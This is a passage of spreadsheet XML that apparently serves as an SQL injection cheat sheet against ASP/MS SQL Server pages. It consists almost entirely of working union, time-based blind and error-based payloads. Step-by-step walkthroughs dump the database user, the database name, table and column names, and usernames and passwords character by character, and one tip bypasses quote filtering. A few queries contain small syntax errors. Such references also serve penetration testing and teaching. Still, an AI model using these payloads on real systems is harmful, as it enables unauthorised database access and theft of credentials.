            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from TABLE-NAME-1--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,uname from users--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,uname from users where uname not in ('admin')--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro23">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> field</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,COLUMN-NAME-2,3,4 from TABLE-NAME-1-- </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro23">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> field</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,COLUMN-NAME-3,3,4 from TABLE-NAME-1--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>2 – Blind sql injection</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Integer injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; WAITFOR DELAY '00:00:10'-- (+10 seconds) </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=x'; WAITFOR DELAY '00:00:10'-- (+10 seconds</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro24">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database user: 3 characters, walkthrough</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>3 - Total Characters </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- (+10 seconds) </text:p>
            <text:p/>
            <text:p>D  - 1st Character </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;97) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- (+10 seconds) </text:p>
            <text:p> </text:p>
            <text:p>B - 2nd Character </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))&gt;97) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds) </text:p>
            <text:p> </text:p>
            <text:p>O - 3rd Character </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))&gt;97) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))&gt;115) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))&gt;105) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))&gt;110) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>Database User = DBO</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database name: PRO-DB-1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(DB_NAME())=8) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))=112) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),2,1)))=114) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),3,1)))=111) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),4,1)))=45) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),5,1)))=100) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),6,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),7,1)))=45) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),8,1)))=49) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>Database Name = PRO-DB-1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> database table: USERS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=5) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=117) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),2,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),3,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),4,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),5,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Table Name = USERS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> database table: ORDERS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS')=6) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),1,1)))=111) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),2,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),3,1)))=100) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),4,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),5,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),6,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Table Name = ORDERS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> database table: CUSTOMERS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS')=9) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),1,1)))=99) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),2,1)))=117) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),3,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),4,1)))=116) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),5,1)))=111) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),6,1)))=109) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),7,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),8,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),9,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Table Name = CUSTOMERS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> table column name: USER</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS')=4) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS'),1,1)))=117) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS'),2,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS'),3,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS'),4,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Column Name = USER</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> table column name: PASS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER')=4) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER'),1,1)))=112) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER'),2,1)))=97) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER'),3,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER'),4,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Column Name = PASS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> table column name: ID</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;,'PASS')=2) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'PASS'),1,1)))=105) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'PASS'),2,1)))=100) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Column Name = ID</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 1<text:span text:style-name="T5">st</text:span> row: ADMIN</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 USER from USERS)=5) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),1,1))=97) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),2,1))=100) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),3,1))=109) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),4,1))=105) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),5,1))=110) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = ADMIN</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> field of 1<text:span text:style-name="T5">st</text:span> row: 123</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 PASS from USERS)=3) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from USERS),1,1))=49) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from USERS),2,1))=50) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from USERS),3,1))=51) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = 123</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> field of 1<text:span text:style-name="T5">st</text:span> row: 100</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 ID  from USERS)=3) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 ID  from USERS),1,1))=49) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 ID  from USERS),2,1))=48) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 ID  from USERS),3,1))=48) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = 100</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 2<text:span text:style-name="T5">nd</text:span> row: Joe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 USER from USERS where USER NOT in ('ADMIN') order by USERS desc)=3) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('ADMIN') order by USER desc),1,1)))=106) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('ADMIN') order by USER desc),2,1)))=111) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('ADMIN') order by USER desc),3,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = JOE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 3<text:span text:style-name="T5">rd</text:span> row: JIM</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 USER from USERS where USER NOT in ('JOE') order by USERS desc)=3) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('JOE') order by USER desc),1,1)))=106) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('JOE') order by USER desc),2,1)))=105) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('JOE') order by USER desc),3,1)))=109) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = JIM</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Determine db_name using char by char ASCII</text:p>
            <text:p> same/similar process for all tables/columns/fields</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;90 –db_name start with ascii &gt; 90? true</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;120 –db_name start with scii &gt; 120? false</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;105</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;112</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;108 –valid</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;109 –invalid</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109 –db_name start with ascii 109 (m)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Determine table name using char by char ASCII</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55)) AS varchar(8000)),1,1)),0)&gt;97 – first char of first table in database</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55)) AS varchar(8000)),2,1)),0)&gt;97 – second char of first table</text:p>
            <text:p/>
            <text:p>In case of other tables, we can find other table names by changing the second select from "SELECT TOP 1" to be "SELECT TOP 2" , "SELECT TOP 3" and so on</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 2 LOWER(name) FROM sysObjects WHERE xtYpe=0x55)) AS varchar(8000)),1,1)),0)=97 – first char of second table</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Determine column name using char by char ASCII</text:p>
            <text:p> circumvent from magic quote filtering, you have to change 'tablename' to be the form of concatenating char() command.</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM syscolumns I WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=1))AS varchar(8000)),1,1)),0)&gt;97 – first char of first column</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM syscolumns i WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=1))AS varchar(8000)),2,1)),0)&gt;97 –second char of first column</text:p>
            <text:p/>
            <text:p>Other columns, change ‘p.x=’ value</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM syscolumns i WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=2))AS varchar(8000)),1,1)),0)&gt;97 –first char of second column</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>3 – ERROR sql injection</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Integer Injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1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String injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=x'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Extract Database user</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 or 1=convert(int,(USER))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[DB USER]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Database name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 or 1=convert(int,(DB_NAME))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[DB NAME]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Database version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 or 1=convert(int,(@@VERSION))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[DB VERSION]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Server name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 or 1=convert(int,(@@SERVERNAME))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[SERVER NAME]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
